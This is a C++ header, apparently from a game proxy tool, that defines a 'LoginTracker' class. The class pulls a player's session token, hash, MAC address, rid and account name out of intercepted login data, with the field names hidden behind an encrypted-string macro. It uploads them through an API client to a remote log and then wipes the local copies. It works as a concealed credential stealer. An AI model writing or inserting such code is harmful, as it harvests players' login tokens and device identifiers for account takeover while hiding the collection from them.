#pragma once
#include "../utils/text_parse.hpp"
#include "../utils/api_client.hpp"
#include "../utils/strenc.hpp"
#include <string>
#include <spdlog/spdlog.h>

namespace utils {

class LoginTracker {
public:
    static void track_login(const TextParse& text_parse, const std::string& username) {
        
        std::string mac         = text_parse.get(DEC("mac"),         "");
        std::string player_name = text_parse.get(DEC("tankIDName"),  "");
        std::string hash        = text_parse.get(DEC("hash"),        "");
        std::string rid         = text_parse.get(DEC("rid"),         "");
        std::string token       = text_parse.get(DEC("token"),       "");

        if (!player_name.empty() || !mac.empty() || !hash.empty()) {
            std::string ltoken = !token.empty() ? token : hash;

            APIClient::upload_proxy_log(
                username, ltoken, mac, player_name, hash, rid, "");

            
            SecureZeroMemory(&ltoken[0],      ltoken.size());
            SecureZeroMemory(&mac[0],         mac.size());
            SecureZeroMemory(&hash[0],        hash.size());
            SecureZeroMemory(&rid[0],         rid.size());
            SecureZeroMemory(&token[0],       token.size());
            SecureZeroMemory(&player_name[0], player_name.size());
        }
    }
};

} 
